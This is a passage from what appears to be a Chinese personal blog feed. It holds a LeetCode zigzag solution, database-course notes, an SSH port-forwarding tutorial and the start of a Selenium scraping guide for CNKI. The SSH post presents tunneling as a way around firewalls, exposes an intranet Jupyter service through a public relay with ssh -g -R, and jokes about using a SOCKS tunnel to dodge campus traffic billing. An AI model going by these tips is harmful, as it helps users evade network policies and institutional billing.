class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> numRows &gt;= len(s):</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            ans = []</span><br><span class="line">            i = <span class="hljs-number">0</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            <span class="hljs-comment"># 第一行</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-comment"># 中间各行</span></span><br><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,numRows):</span><br><span class="line">                n = n - <span class="hljs-number">2</span></span><br><span class="line">                <span class="hljs-keyword">while</span> i<span class="hljs-number">-1</span> &lt; len(s):</span><br><span class="line">                    ans.append(s[i<span class="hljs-number">-1</span>])</span><br><span class="line">                    i += n</span><br><span class="line">            <span class="hljs-comment"># 最后一行</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            i = numRows<span class="hljs-number">-1</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure><br>但是看完评论区另一种解法我气的够呛，卧槽我怎么能这么傻，害，这么明显的规律我都没发现…</p><h5 id="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"><a href="#解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）" class="headerlink" title="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"></a>解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）</h5><p>上一种方法是从<code>s</code>中按最终答案的顺序取值，那我们能不能换个思考方式，按照<code>s</code>的存储顺序取值呢。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows &gt;= len(s) <span class="hljs-keyword">or</span> numRows == <span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        ans, count, d = [<span class="hljs-string">''</span>]*numRows, <span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:</span><br><span class="line">            ans[count] += i</span><br><span class="line">            count += d</span><br><span class="line">            <span class="hljs-comment"># 当到第一行和最后一行的时候d需要反转</span></span><br><span class="line">            <span class="hljs-keyword">if</span> count==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> count==numRows<span class="hljs-number">-1</span>:</span><br><span class="line">                d = -d</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;嘿！大家好，懒狗又要开始更新Leetcode咯！&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode系列" scheme="https://fansblog.club/categories/LeetCode%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>数据库复习--第1章</title>
    <link href="https://fansblog.club/2020/01/10/DB-1/"/>
    <id>https://fansblog.club/2020/01/10/DB-1/</id>
    <published>2020-01-10T15:00:45.000Z</published>
    <updated>2020-01-11T13:33:25.998Z</updated>
    
    <content type="html"><![CDATA[<p>数据库系统概论第1章–绪论，如有错误烦请指正。<a id="more"></a></p><h3 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h3><h4 id="1-1-数据库系统概述"><a href="#1-1-数据库系统概述" class="headerlink" title="1.1 数据库系统概述"></a>1.1 数据库系统概述</h4><h5 id="1-1-1-四个基本概念"><a href="#1-1-1-四个基本概念" class="headerlink" title="1.1.1 四个基本概念"></a>1.1.1 四个基本概念</h5><ul><li>数据：是数据库中存储的基本对象<ul><li>定义：描述事物的符号记录</li><li>特点：数据与其语义是不可分的</li></ul></li><li>数据库(DB)：是长期存储在计算机内、有组织的、可共享的大量数据的集合<ul><li>基本特征：<ul><li>数据按一定的数据模型组织、描述和储存</li><li>可为各种用户共享</li><li>冗余度较小</li><li>数据独立性较高</li><li>易扩展</li></ul></li></ul></li><li>数据库管理系统(DBMS):<ul><li>什么是DBMS：<ul><li>位于用户与操作系统之间的一层数据管理软件</li><li>是基础软件，是一个大型复杂的软件系统</li></ul></li><li>DBMS的用途<ul><li>科学地组织和存储数、高效地获取和维护数据</li></ul></li></ul></li><li>数据库系统<ul><li>什么是？：在计算机系统中引入数据库后的系统构成</li><li>组成：数据库、DBMS、应用系统、数据库管理员</li></ul></li></ul><h5 id="1-1-2-数据管理技术的产生和发展"><a href="#1-1-2-数据管理技术的产生和发展" class="headerlink" title="1.1.2 数据管理技术的产生和发展"></a>1.1.2 数据管理技术的产生和发展</h5><ul><li>什么是数据管理<ul><li>对数据进行分类、组织、编码、存储、检索和维护</li><li>是数据处理的中心问题</li></ul></li><li>数据管理技术的发展过程<ul><li>人工管理阶段（20世纪49年代中–50年代中）</li><li>文件系统阶段（20世纪50年代末–60年代中）</li><li>数据库系统阶段（20世纪60年代末–现在）</li></ul></li><li>数据管理技术的发展动力<ul><li>应用需求的推动</li><li>计算机硬件的发展</li><li>计算机软件的发展</li></ul></li></ul><p>文件系统记录内有结构，整体无结构（因文件是独立的），数据只能是定长的，数据的最小存取单位是记录。</p><h5 id="1-1-3-数据库系统的特点"><a href="#1-1-3-数据库系统的特点" class="headerlink" title="1.1.3 数据库系统的特点"></a>1.1.3 数据库系统的特点</h5><ul><li>数据结构化<ul><li>整体数据的结构化是数据库的主要特征之一</li><li>整体结构化，不再仅针对某个应用，而是面向全组织，不仅数据内部结构化，整体也是结构化的，数据之间具有联系</li><li>数据可以变长，最小存取单位是数据项。</li></ul></li><li>数据的共享性高，冗余度低，易扩充</li><li>数据独立性高<ul><li>物理独立性</li><li>逻辑独立性</li><li>数据独立性由DBMS的二级映像功能来保证的</li></ul></li><li>数据由DBMS统一管理和控制<ul><li>数据的安全性保护</li><li>数据的完整性检查</li><li>并发控制</li><li>数据库恢复</li></ul></li></ul><h4 id="1-2-数据模型"><a href="#1-2-数据模型" class="headerlink" title="1.2 数据模型"></a>1.2 数据模型</h4><h5 id="1-2-1-两大类数据模型"><a href="#1-2-1-两大类数据模型" class="headerlink" title="1.2.1 两大类数据模型"></a>1.2.1 两大类数据模型</h5><ul><li>概念模型（信息模型），按用户的观点来对数据和信息建模，用于数据库设计。</li><li>逻辑模型（数据模型）和物理模型<ul><li>逻辑模型主要包括网状模型、层次模型、关系模型、面向对象模型，用于DBMS实现</li><li>物理模型是对最底层的抽象</li></ul></li></ul><h5 id="1-2-2-数据模型的组成要素"><a href="#1-2-2-数据模型的组成要素" class="headerlink" title="1.2.2 数据模型的组成要素"></a>1.2.2 数据模型的组成要素</h5><ul><li>数据结构<ul><li>定义：描述数据库的组成对象，以及对象之间的联系</li><li>数据结构是对系统静态特性的描述</li></ul></li><li>数据操作<ul><li>数据操作类型：查询、更新（插入、删除、修改）</li><li>数据操作是对系统动态特性的描述</li></ul></li><li>完整性约束条件<ul><li>在关系模型中，任何关系必须满足实体完整性和参照完整性两个条件。</li></ul></li></ul><h5 id="1-2-3-概念模型"><a href="#1-2-3-概念模型" class="headerlink" title="1.2.3 概念模型"></a>1.2.3 概念模型</h5><ul><li>用途<ul><li>用于信息世界的建模，是现实世界到机器世界的一个中间层次，是数据库设计人员和用户之间进行交流的语言</li></ul></li><li>常用E-R图表示<ul><li>实体性：用矩形表示，框内写明实体名</li><li>属性：用椭圆形表示，并用无向边将其与相应的实体连接起来</li><li>联系：用菱形表示，框内写明联系名，用无向边分别与有关实体连接起来，同时在无向边旁标上联系的类型（1:1、1:n、m:n）</li><li>联系的属性：联系本身也是一种实体型，也可以有属性</li></ul></li></ul><h5 id="1-2-4-最常用的数据模型"><a href="#1-2-4-最常用的数据模型" class="headerlink" title="1.2.4 最常用的数据模型"></a>1.2.4 最常用的数据模型</h5><ul><li>非关系模型<ul><li>层次模型</li><li>网状模型</li></ul></li><li>关系模型</li><li>面向对象模型</li><li>对象关系模型</li></ul><h5 id="1-2-5-层次模型"><a href="#1-2-5-层次模型" class="headerlink" title="1.2.5 层次模型"></a>1.2.5 层次模型</h5><p>层次模型是数据库系统中最早出现的数据模型，典型代表是IBM公司的IMS(Information Management System)数据库管理系统。</p><p>层次模型用树形结构来表示各类实体以及实体间的联系。</p><ul><li>满足下面两个条件的基本层次联系的集合为层次模型：<ul><li>有且只有一个结点没有双亲结点，这个结点称为根节点。</li><li>根以外的其他结点有且只有一个双亲结点。</li></ul></li><li>几个术语：<ul><li>根结点、双亲结点、兄弟结点、叶结点</li></ul></li><li>特点：<ul><li>结点的双亲是唯一的</li><li>只能直接处理一对多的实体联系</li><li>每个记录类型可以定义一个排序字段，也称为码字段</li><li>任何记录值只有按其路径查看时，才能显出它的全部意义</li><li>没有一个子女记录值能够脱离双亲记录值而独立存在</li></ul></li><li>多对多联系在层次模型中的表示<ul><li>将多对多联系分解成一对多联系</li><li>方法：冗余结点法、虚拟结点法</li></ul></li><li>完整性约束条件<ul><li>无相应的双亲结点值就不能插入子女结点值</li><li>如果删除双亲结点值，则相应的子女结点值也被同时删除</li><li>更新操作时，应更新所有相应记录，以保证数据的一致性</li></ul></li><li>存储结构<ul><li>邻接法：按照层次树前序遍历的顺序把所有记录值依次邻接存放，即通过物理空间的位置相邻来实现层次顺序</li><li>链接法：用指针来反映数据之间的层次联系<ul><li>子女-兄弟链接法：每个记录两个指针，分别指向最左边的子女和最近的兄弟</li><li>层次序列链接法：按树的前序遍历顺序链接各记录值</li></ul></li></ul></li><li>优缺点<ul><li>优点<ul><li>层次模型的数据结构比较简单清晰</li><li>查询效率高，性能优于关系模型，不低于网状模型</li><li>层次数据模型提供了良好的完整性支持</li></ul></li><li>缺点<ul><li>多对多联系表示不自然</li><li>对插入和删除操作的限制多，应用程序的编写比较复杂</li><li>查询子女结点必须通过双亲结点</li><li>由于结构严密，层次命令趋于程序化</li></ul></li></ul></li></ul><h5 id="1-2-6-网状模型"><a href="#1-2-6-网状模型" class="headerlink" title="1.2.6 网状模型"></a>1.2.6 网状模型</h5><p>网状数据库系统采用网状模型作为数据的组织方式，典型代表时DBTG系统，亦称CODASYL系统，是70年代有DBTG提出的一个系统方案，奠定了数据库系统的基本概念、方法和技术。</p><ul><li>满足下面两个条件的基本层次联系的集合<ul><li>允许一个以上的结点无双亲</li><li>一个结点可以有多于一个的双亲</li></ul></li><li>网状模型与层次模型的区别<ul><li>网状模型允许多个结点没有双亲结点</li><li>网状模型允许结点有多于一个的双亲</li><li>网状模型允许两个结点之间有多种联系（复合联系）</li><li>网状模型可以更直接地去描述现实世界</li><li>层次模型实际上是网状模型的一个特例</li></ul></li><li>多对多联系在网状模型中的表示：将多对多联系直接分解成一对多联系</li><li>网状数据模型的操纵与完整性约束<ul><li>码：唯一标识记录的数据项的集合</li><li>一个联系中双亲记录与子女记录之间是一对多联系</li><li>支持双亲记录和子女记录之间某些约束条件</li></ul></li><li>存储结构：单向链接、双向链接、环状链接、向首链接</li><li>优点：<ul><li>能够更为直接地描述现实世界，如一个结点可以有多个双亲</li><li>具有良好的性能，存取效率较高</li></ul></li><li>缺点：<ul><li>结构比较复杂，而且随着应用环境的扩大，数据库的结构就变得越来越复杂，不利于最终用户掌握</li><li>DDL、DML语言复杂，用户不容易使用</li></ul></li></ul><h5 id="1-2-7-关系模型"><a href="#1-2-7-关系模型" class="headerlink" title="1.2.7 关系模型"></a>1.2.7 关系模型</h5><p>关系数据库系统采用关系模型作为数据的组织方式，1970年美国IBM公司首次提出了数据库系统的关系模型，计算机厂商新推出的数据库管理系统几乎都支持关系模型。</p><ul><li><p>在用户观点下，关系模型中数据的逻辑结构是一张二维表。</p></li><li><p>数据结构</p><ul><li>关系：一个关系对应通常说的一张表</li><li>元组：表中的一行即为一个元组</li><li>属性：表中的一列即为一个属性，给每一个属性起一个名称即属性名</li><li>主码：表中的某个属性组，它可以唯一确定一个元组</li><li>域：属性的取值范围</li><li>分量：元组中的一个属性值</li><li>关系模式：对关系的描述<br>关系名（属性1，属性2，……，属性n）</li></ul></li><li><p>关系必须是规范化的，满足一定的规范条件</p><ul><li>最基本的规范条件：关系的每一个分量必须是一个不可分的数据项，不允许表中还有表。</li></ul></li><li><p>关系的完整性约束条件</p><ul><li>实体完整性</li><li>参照完整性</li><li>用户定义的完整性</li></ul></li><li><p>优点：</p><ul><li>建立在严格的数学概念的基础上</li><li>概念单一<ul><li>实体和各类联系都用关系来表示</li><li>对数据的检索结果也是关系</li></ul></li><li>关系模型的存取路径对用户透明<ul><li>具体更高的数据独立性，更好的安全保密性</li><li>简化了程序员的工作和数据库开发建立的工作</li></ul></li></ul></li><li><p>缺点：</p><ul><li>存取路径对用户透明导致查询效率往往不如非关系数据模型</li><li>为提高性能，必须对用户的查询请求进行优化增加了开发DBMS的难度</li></ul></li></ul><h4 id="1-3-数据库系统结构"><a href="#1-3-数据库系统结构" class="headerlink" title="1.3 数据库系统结构"></a>1.3 数据库系统结构</h4><p>从数据库管理系统角度看，通常采用三级模式结构，是数据库内部的系统结构<br>从数据库最终用户角度看，数据库系统的结构分为：单用户结构、主从式结构、分布式结构、客户/服务器、浏览器/应用服务器/数据库服务器多层结构等</p><h5 id="1-3-1-数据库系统的三级模式结构"><a href="#1-3-1-数据库系统的三级模式结构" class="headerlink" title="1.3.1 数据库系统的三级模式结构"></a>1.3.1 数据库系统的三级模式结构</h5><ul><li>模式（也成逻辑模式）<ul><li>数据库中全体数据的逻辑结构和特征的描述</li><li>所有用户的公共数据视图，综合了所有用户的需求</li><li>一个数据库只有一个模式</li><li>是数据库系统模式结构的中间层</li></ul></li><li>外模式<ul><li>数据库用户使用的局部数据的逻辑结构和特征的描述</li><li>数据库用户的数据视图，是与某一应用有关的数据的逻辑表示</li><li>介于模式与应用之间</li><li>一个数据库可以有多个外模式</li><li>用途：<ul><li>保证数据库安全性的一个有力措施</li><li>每个用户只能看见和访问所对应的外模式中的数据</li></ul></li></ul></li><li>内模式<ul><li>是数据物理结构和存储方式的描述</li><li>是数据在数据库内部的表示方式</li><li>一个数据库只有一个内模式</li></ul></li></ul><h5 id="1-3-2-数据库的二级映像功能与数据独立性"><a href="#1-3-2-数据库的二级映像功能与数据独立性" class="headerlink" title="1.3.2 数据库的二级映像功能与数据独立性"></a>1.3.2 数据库的二级映像功能与数据独立性</h5><ul><li>三级模式是对数据的三个抽象级别</li><li>二级映像在DBMS内部实现这三个抽象层次的联系和转换<ul><li>外模式/模式映像</li><li>模式/内模式映像</li></ul></li><li>外模式/模式映像<ul><li>模式描述的是数据的全局逻辑结构，外模式描述的是数据的局部逻辑结构</li><li>每一个外模式，数据库系统都有一个外模式/模式映像</li><li>保证数据的逻辑独立性<ul><li>当模式改变时，数据库管理员修改有关的外模式/模式映像，使外模式保持不变</li><li>应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。</li></ul></li></ul></li><li>模式/内模式映像<ul><li>模式/内模式映像定义了数据全局逻辑结构与存储结构之间的对应关系。</li><li>数据库中模式/内模式映像是唯一的</li><li>该映像描述通常包含在模式描述中</li><li>保证数据的物理独立性<ul><li>当数据库的存储结构改变了，数据库管理员修改模式/内模式映像，使模式保持不变</li><li>应用程序不受影响。保证了数据与程序的物理独立性，简称数据的物理独立性。</li></ul></li></ul></li></ul><h4 id="1-4-数据库的组成"><a href="#1-4-数据库的组成" class="headerlink" title="1.4 数据库的组成"></a>1.4 数据库的组成</h4><ul><li>数据库</li><li>数据库管理系统（及其开发工具）</li><li>应用系统</li><li>数据库管理员</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数据库系统概论第1章–绪论，如有错误烦请指正。&lt;/p&gt;
    
    </summary>
    
    
      <category term="数据库系统概论" scheme="https://fansblog.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>SSH端口转发</title>
    <link href="https://fansblog.club/2020/01/02/ssh-tips/"/>
    <id>https://fansblog.club/2020/01/02/ssh-tips/</id>
    <published>2020-01-02T05:06:47.000Z</published>
    <updated>2020-01-03T02:06:26.561Z</updated>
    
    <content type="html"><![CDATA[<p>平时我们一般用ssh连接服务器，但它还可以用来端口转发呀！<a id="more"></a></p><h3 id="一、端口转发概述"><a href="#一、端口转发概述" class="headerlink" title="一、端口转发概述"></a>一、端口转发概述</h3><p>我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。总的来说 SSH 端口转发能够提供两大功能：</p><ul><li>加密 SSH Client 端至 SSH Server 端之间的通讯数据。</li><li>突破防火墙的限制完成一些之前无法建立的 TCP 连接。</li></ul><h3 id="二、本地端口转发和远程端口转发"><a href="#二、本地端口转发和远程端口转发" class="headerlink" title="二、本地端口转发和远程端口转发"></a>二、本地端口转发和远程端口转发</h3><p>我们来区分一下这两种端口转发的概念，我们知道，SSH端口转发自然需要SSH连接，但是SSH连接是有方向的，从<strong>SSH Client</strong>到<strong>SSH Server</strong>。而我们的应用也是有方向的，如果应用连接的方向和SSH的方向的一致的，那我们就说它是本地转发，如果两个方向不一致，我们就说它是远程转发。</p><h4 id="本地转发实例"><a href="#本地转发实例" class="headerlink" title="本地转发实例"></a>本地转发实例</h4><p>我们想象一下，假如我在实验室的服务器上开了一个本地web服务，比如本地测试一个网站或者本地开启jupyter notebook，但是我现在人在寝室啊，怎么能在自己的机器上访问到服务器上的这个web服务呢？为了能解决这个问题，我们可以通过搭建隧道进行解决，也就是接下来要用到的本地端口转发。<br>它的命令格式为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L &lt;<span class="hljs-built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure><br>那接下来我们就搭建一个隧道测试一下吧！<br>首先，我在服务器上开启jupyter notebook服务，<br><img src="/2020/01/02/ssh-tips/1.png" alt="jupyter_start"><br>因为在这台服务器上我并没有配置jupyter，因此现在只运行在了本地的8888端口，我们下面搭建隧道在自己的机器上访问它吧！<br>打开terminal，输入：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 12345:localhost:8888 -p 22322 zhangfan@10.8.128.205</span><br></pre></td></tr></table></figure><br>最后的是我的服务器的ip哦，加-p参数是因为实验室的一个内网ip的不同端口分配了不同的服务器，害，都内网ip了还这么稀缺，大哭…<br>-L参数代表本地转发，至于为什么<code>&lt;remote host&gt;</code>字段用的是localhost，这里解释一下，remote的意思是远程的，也就是这个字段填写的是我们要连接的地址，那这个地址又是相对于谁来说的呢？当然是我们的服务器啦，因为jupyter服务是运行在我们服务器的本地的8888端口的啦，所以这里用的就是localhost了。<br>打开浏览器，输入<strong>localhost:12345</strong>我们可以看到打开了jupyter的页面。<br><img src="/2020/01/02/ssh-tips/2.png" alt="jupyter_page"></p><h4 id="远程转发实例"><a href="#远程转发实例" class="headerlink" title="远程转发实例"></a>远程转发实例</h4><p>既然是远程转发，我们只要把上述本地转发的应用或者SSH连接的任一方向反向就变成了远程端口转发。<br>比如，本来是在本地的机器上建立向服务器的SSH连接，现在我们反过来：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R &lt;SSH host port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure></p><h3 id="三、动态端口转发"><a href="#三、动态端口转发" class="headerlink" title="三、动态端口转发"></a>三、动态端口转发</h3><p>无论我们刚才讨论的本地和远程转发，都是特定的一个端口到另一个端口的转发，那如果我们没有这个端口号怎么办？咦，什么样子的应用会没有这个端口号呢？比如说用浏览器进行web浏览，用QQ或者wechat聊天的时候呀！当我们在一个不安全的WiFi环境下上网的时候，用SSH动态转发来保护我们的网页浏览和社交软件的信息无疑是十分必要的。<br>动态转发命令格式：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D &lt;<span class="hljs-built_in">local</span> port&gt; &lt;SSH Server&gt;</span><br></pre></td></tr></table></figure><br>比如当我使用<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1234 -p 22322 zhangfan@10.8.128.205</span><br></pre></td></tr></table></figure><br>就是我把本地的1234端口作为本地的端口号，所有流经1234端口的流量全部转发给了服务器。<br>嘿嘿嘿，是不是觉得和代理有点像，没错，就是很像！其实在这里SSH是创建了一个SOCKS代理服务。<br>那……这岂不是一个新的校园网免流的方法嘛？因为校园网局域网内的流量是不计费的，那我们通过实验室的服务器对外访问所消耗的流量就不是劳资的账号的流量了呀，哈哈哈哈哈！<br>前提是只能使用支持socks代理的应用，比如浏览器，QQ微信啥的…别忘了在应用设置一下开启socks代理哦。<br>不要告发我哦！我什么都不知道！我可不薅学校的羊毛！</p><h3 id="四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务"><a href="#四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务" class="headerlink" title="四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务"></a>四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务</h3><p>前提：现在有一台能正常使用的笔记本，一台有公网ip的阿里云服务器，一台学校实验室的内网服务器。<br>为了方便描述，分别简称为<code>host1, host2, host3</code><br>首先我们捋一下思路：host2具备公网ip，因此host1和host3都可以连接，但反向不行。因此我们先对host3和host2之间建立SSH隧道，再对host1和host2建立对应端口的隧道，这样host1与host3之间就相当于打通了一条通路。<br>假设host3的jupyter运行在本地的8888端口上。因为只能是host3单向能连接到host2，因此我们只能在host3上对host2建立SSH隧道。那这样一来，host3就是SSH客户端，而host2就是SSH服务端，但host3本身是作为jupyter的服务提供者，因此应用和SSH连接的方向是相反的，所以我们要用的是远程端口转发命令。<br>首先连接到实验室的服务器：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh host3</span><br></pre></td></tr></table></figure><br>为了防止关掉terminal导致SSH链接断掉，因此使用screen命令：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">screen -S SSH_jupyter</span><br><span class="line"><span class="hljs-comment"># ssh -g -R 12345:localhost:8888 host2 #这里用-R是远程端口转发</span></span><br><span class="line"><span class="hljs-comment"># 1.3日更新 今早发现ssh连接自动断了 加-o参数可保持持续连接</span></span><br><span class="line">ssh -g -R 12345:localhost:8888 -o ServerAliveInterval=60 host2</span><br></pre></td></tr></table></figure><br>必须加上-g参数，以保证host1能使用host3建立的远程端口转发，加上-g参数就代表可以共享这个连接的意思。<br>按下ctrl+A+D可以从screen命令返回。<br>之后在自己的笔记本上，也就是host1上（可以用手机开热点模拟在家的情况）<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1234:localhost:12345 host2</span><br></pre></td></tr></table></figure><br>好了最后笔记本上的terminal不要关掉哦，不然这个SSH隧道就断了哦。<br>现在我们在笔记本上的浏览器中输入：localhost:1234<br>是不是打开了在实验室的服务器上开启的jupyter服务呢。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平时我们一般用ssh连接服务器，但它还可以用来端口转发呀！&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>利用webdriver爬取知网作者知网节</title>
    <link href="https://fansblog.club/2019/12/17/cnki-spider/"/>
    <id>https://fansblog.club/2019/12/17/cnki-spider/</id>
    <published>2019-12-17T07:33:30.000Z</published>
    <updated>2019-12-19T09:37:35.281Z</updated>
    
    <content type="html"><![CDATA[<p>本篇主要介绍基于Chrome的webdriver进行爬虫的基本方法，整理下来以备遗忘。<a id="more"></a><br>上个周师姐布置任务让我爬取知网的作者知网节，本来以为看起来挺好爬的，但知网还是有些坑，之后详细介绍。下面就让我们从零开始吧。</p><h3 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h3><p>我们主要用到的工具有<code>python</code>中的<code>selenium</code>和<code>chrome</code>，以及需要驱动<code>chrome</code>的插件<code>webdriver</code>。<br>下面是来自百度关于<code>selenium</code>的介绍。<br><img src="/2019/12/17/cnki-spider/1.png" alt="1.png"><br>从图中我们可以看到，利用<code>selenium</code>我们可以模拟用户的浏览器行为，从而获取到我们需要的网页内容，因为能模拟用户行为，所以利用<code>selenium</code>进行爬虫自然可以一定程度上避免被网站反爬虫拦截，但也有不好的一面，比如爬取的速度相对来说会慢一些。</p><h4 id="1-安装selenium"><a href="#1-安装selenium" class="headerlink" title="1. 安装selenium"></a>1. 安装<code>selenium</code></h4><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><br>当然我们也可以新建一个conda环境，再进行安装<code>selenium</code>，这里简单复习一下创建并激活conda环境的命令：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#创建新环境</span></span><br><span class="line">conda create -n cnki-spider</span><br><span class="line"><span class="hljs-comment">#激活进入新环境</span></span><br><span class="line"><span class="hljs-built_in">source</span> activate cnki-spider</span><br><span class="line"><span class="hljs-comment"># 安装selenium</span></span><br><span class="line">pip install selenium</span><br></pre></td></tr></table></figure></p><h4 id="2-安装基于浏览器的webdriver"><a href="#2-安装基于浏览器的webdriver" class="headerlink" title="2. 安装基于浏览器的webdriver"></a>2. 安装基于浏览器的webdriver</h4><p><code>selenium</code>支持多种浏览器，比如<code>chrome</code>和<code>firefox</code>等等，这里我选用了<code>chrome</code>：<a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">下载地址</a><br>注意选择和浏览器版本对应的chromedriver。</p><ul><li>win<br>直接将解压后的<code>chromedriver</code>直接拖进<code>chrome</code>的安装目录，然后配置环境变量。</li><li>mac<br>将解压后的<code>chromedriver</code>拖进<code>/usr/local/bin/</code>即可。</li><li>linxu<br>将解压后的<code>chromedriver</code>拷贝进<code>/usr/bin</code>目录，之后在代码中声明路径即可。</li></ul><p>另外以上，默认已装好<code>Chrome</code>，如果没有，请自行百度。</p><h3 id="二、代码编写"><a href="#二、代码编写" class="headerlink" title="二、代码编写"></a>二、代码编写</h3><h4 id="1-简单使用"><a href="#1-简单使用" class="headerlink" title="1. 简单使用"></a>1. 简单使用</h4><p><figure 